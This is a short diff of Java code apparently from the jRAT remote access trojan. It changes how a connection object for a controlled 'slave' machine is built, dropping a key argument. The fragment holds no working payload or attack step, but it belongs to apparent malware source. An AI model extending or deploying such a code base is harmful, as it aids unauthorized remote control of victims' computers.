@@ -18,7 +18,7 @@ import jrat.api.Writer;
 public class RATObjectFormat {
 
 	public static RATObject format(final Slave s) {
-		Connection con = new Connection(s.getConnection().getTimeout(), s.getConnection().getKey().getTextualKey(), s.getConnection().getPass(), s.getConnection().getName());
+		Connection con = new Connection(s.getConnection().getTimeout(), s.getConnection().getPass(), s.getConnection().getName());
 
 		final DataOutputStream out = s.getDataOutputStream();
 		final DataInputStream in = s.getDataInputStream();
